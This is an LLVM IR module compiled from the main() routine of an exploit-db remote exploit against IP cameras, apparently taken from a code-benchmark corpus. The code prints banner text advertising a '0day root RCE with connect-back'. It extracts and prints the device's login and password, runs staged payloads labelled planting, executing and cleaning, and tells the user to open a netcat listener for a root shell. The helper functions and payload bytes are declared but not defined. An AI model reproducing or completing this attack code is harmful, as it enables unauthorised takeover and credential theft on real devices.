; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_43142.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_43142.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [55 x i8] c"Camera 0day root RCE with connect-back @PierreKimSec\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"%s target\0A\00", align 1
@.str.2 = private unnamed_addr constant [66 x i8] c"%s target --get-config      will dump the configuration and exit\0A\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"Please run `nc -vlp %s` on %s\0A\0A\00", align 1
@REMOTE_PORT = common dso_local global i8* null, align 8
@REMOTE_HOST = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [13 x i8] c"--get-config\00", align 1
@.str.5 = private unnamed_addr constant [16 x i8] c"exploit failed\0A\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"done\0A\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"    login = %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"    pass  = %s\0A\00", align 1
@PAYLOAD_0 = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [9 x i8] c"planting\00", align 1
@PAYLOAD_1 = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [10 x i8] c"executing\00", align 1
@PAYLOAD_2 = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [9 x i8] c"cleaning\00", align 1
@.str.12 = private unnamed_addr constant [36 x i8] c"[+] enjoy your root shell on %s:%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str, i64 0, i64 0))
  %10 = load i32, i32* %5, align 4
  %11 = icmp slt i32 %10, 2
  br i1 %11, label %12, label %21

12:                                               ; preds = %3
  %13 = load i8**, i8*** %6, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i8* %15)
  %17 = load i8**, i8*** %6, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.2, i64 0, i64 0), i8* %19)
  store i32 1, i32* %4, align 4
  br label %103

21:                                               ; preds = %3
  %22 = load i32, i32* %5, align 4
  %23 = icmp eq i32 %22, 2
  br i1 %23, label %24, label %28

24:                                               ; preds = %21
  %25 = load i8*, i8** @REMOTE_PORT, align 8
  %26 = load i8*, i8** @REMOTE_HOST, align 8
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0), i8* %25, i8* %26)
  br label %28

28:                                               ; preds = %24, %21
  %29 = load i32, i32* %5, align 4
  %30 = icmp eq i32 %29, 3
  br i1 %30, label %31, label %42

31:                                               ; preds = %28
  %32 = load i8**, i8*** %6, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 2
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @strcmp(i8* %34, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0))
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %42, label %37

37:                                               ; preds = %31
  %38 = load i8**, i8*** %6, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i8* @creds(i8* %40, i32 1)
  store i8* %41, i8** %8, align 8
  br label %47

42:                                               ; preds = %31, %28
  %43 = load i8**, i8*** %6, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
  %45 = load i8*, i8** %44, align 8
  %46 = call i8* @creds(i8* %45, i32 0)
  store i8* %46, i8** %8, align 8
  br label %47

47:                                               ; preds = %42, %37
  %48 = load i8*, i8** %8, align 8
  %49 = icmp eq i8* %48, null
  br i1 %49, label %50, label %52

50:                                               ; preds = %47
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0))
  store i32 1, i32* %4, align 4
  br label %103

52:                                               ; preds = %47
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0))
  %54 = load i8*, i8** %8, align 8
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0), i8* %54)
  %56 = load i8*, i8** %8, align 8
  %57 = getelementptr inbounds i8, i8* %56, i64 32
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i64 0, i64 0), i8* %57)
  %59 = load i8**, i8*** %6, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = load i8*, i8** %8, align 8
  %63 = load i32, i32* @PAYLOAD_0, align 4
  %64 = call i32 @rce(i8* %61, i8* %62, i32 %63, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i64 0, i64 0))
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %68, label %66

66:                                               ; preds = %52
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0))
  br label %68

68:                                               ; preds = %66, %52
  %69 = call i32 @sleep(i32 1)
  %70 = load i8**, i8*** %6, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 1
  %72 = load i8*, i8** %71, align 8
  %73 = load i8*, i8** %8, align 8
  %74 = load i32, i32* @PAYLOAD_1, align 4
  %75 = call i32 @rce(i8* %72, i8* %73, i32 %74, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0))
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %79, label %77

77:                                               ; preds = %68
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0))
  br label %79

79:                                               ; preds = %77, %68
  %80 = load i8**, i8*** %6, align 8
  %81 = getelementptr inbounds i8*, i8** %80, i64 1
  %82 = load i8*, i8** %81, align 8
  %83 = load i8*, i8** %8, align 8
  %84 = load i32, i32* @PAYLOAD_2, align 4
  %85 = call i32 @rce(i8* %82, i8* %83, i32 %84, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.11, i64 0, i64 0))
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %89, label %87

87:                                               ; preds = %79
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0))
  br label %89

89:                                               ; preds = %87, %79
  %90 = load i8**, i8*** %6, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 1
  %92 = load i8*, i8** %91, align 8
  %93 = load i8*, i8** %8, align 8
  %94 = load i32, i32* @PAYLOAD_1, align 4
  %95 = call i32 @rce(i8* %92, i8* %93, i32 %94, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.11, i64 0, i64 0))
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %99, label %97

97:                                               ; preds = %89
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0))
  br label %99

99:                                               ; preds = %97, %89
  %100 = load i8*, i8** @REMOTE_HOST, align 8
  %101 = load i8*, i8** @REMOTE_PORT, align 8
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.12, i64 0, i64 0), i8* %100, i8* %101)
  store i32 0, i32* %4, align 4
  br label %103

103:                                              ; preds = %99, %50, %12
  %104 = load i32, i32* %4, align 4
  ret i32 %104
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i8* @creds(i8*, i32) #1

declare dso_local i32 @rce(i8*, i8*, i32, i8*) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
